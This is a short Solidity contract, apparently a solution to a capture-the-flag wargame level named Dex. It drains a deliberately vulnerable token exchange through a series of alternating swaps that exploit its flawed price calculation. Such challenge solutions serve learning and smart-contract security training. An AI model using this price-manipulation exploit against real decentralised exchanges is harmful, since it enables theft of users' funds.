// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../Levels/Dex.sol";

contract DexAttack {
  Dex dex;
  address add;

  constructor(address _dex) {
    dex = Dex(_dex);
    add = _dex;
  }

  function attack() public {
    address token1 = dex.token1();
    address token2 = dex.token2();
    IERC20(token1).transferFrom(msg.sender, address(this), 10);
    IERC20(token2).transferFrom(msg.sender, address(this), 10);
    dex.approve(add, 1000000);
    dex.swap(token1, token2, dex.balanceOf(token1, address(this)));
    dex.swap(token2, token1, dex.balanceOf(token2, address(this)));
    dex.swap(token1, token2, dex.balanceOf(token1, address(this)));
    dex.swap(token2, token1, dex.balanceOf(token2, address(this)));
    dex.swap(token1, token2, dex.balanceOf(token1, address(this)));
    dex.swap(token2, token1, 45);
  }
}
